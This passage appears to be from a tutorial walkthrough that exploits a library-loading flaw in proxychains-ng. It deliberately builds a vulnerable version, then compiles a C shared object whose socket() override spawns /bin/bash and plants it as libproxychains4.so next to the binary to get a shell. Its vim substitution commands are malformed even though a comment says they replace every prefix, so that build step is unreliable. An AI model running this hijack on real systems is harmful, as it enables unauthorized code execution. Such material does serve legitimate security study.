Compile the program with the ignore_cve flag on , so the program is vulnerable. $ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer) # find the "ignore_cve" field, and change it to "yes" (without quote marks), save and close the editor. $ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/. # These 2 last commands will change every "$(prefix)" and "$(exec_prefix)" with ".", since we only want to build proxychains in our current directory. $ ./configure
$ make && make install # you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng). Write and Compile the exploit We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack. After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one. Let's write the exploit :) #include <stdio.h>
#include <stdlib.h> int socket(){ system("/bin/bash"); return 0;
} Let's compile the exploit as a shared object gcc -shared -nostdlib -o libproxychains4.so payload.c Bypass the default libproxychains4.so using our exploit Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is libproxychains4.so and you should get a shell...
